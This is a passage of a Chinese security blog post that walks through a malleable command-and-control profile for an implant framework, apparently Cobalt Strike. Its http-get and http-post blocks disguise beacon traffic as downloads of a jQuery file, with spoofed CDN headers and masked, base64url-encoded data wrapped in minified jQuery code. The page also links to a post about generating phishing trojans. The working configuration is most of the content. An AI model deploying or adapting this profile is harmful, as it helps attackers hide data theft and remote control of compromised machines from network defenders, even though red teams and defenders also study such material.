Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>http get 请求的相关配置。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">		<span class="comment"># http post 请求相关配置</span></span><br><span class="line">    <span class="attribute">set</span> uri <span class="string">&quot;/jquery-3.3.2.min.js&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> verb <span class="string">&quot;POST&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">client</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="section">id</span> &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="attribute">parameter</span> <span class="string">&quot;__cfduid&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">output</span> &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="section">output</span> &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line</span></span><br><span class="line">            <span class="attribute">prepend</span> <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            <span class="attribute">prepend</span> <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            <span class="attribute">append</span> <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>http post 请求，和 get 请求配置差不多。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/10/yuque/%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/" rel="prev" title="快速生成钓鱼木马">
+      <i class="fa fa-chevron-left"></i> 快速生成钓鱼木马
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E7%A4%BA"><span class="nav-number">1.</span> <span class="nav-text">提示</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB"><span class="nav-number">2.</span> <span class="nav-text">配置解读</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="darkb1rd"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">darkb1rd</p>
+  <div class="site-description" itemprop="description">孤舟蓑笠翁，独钓寒江雪</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">darkb1rd</span>
+</div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
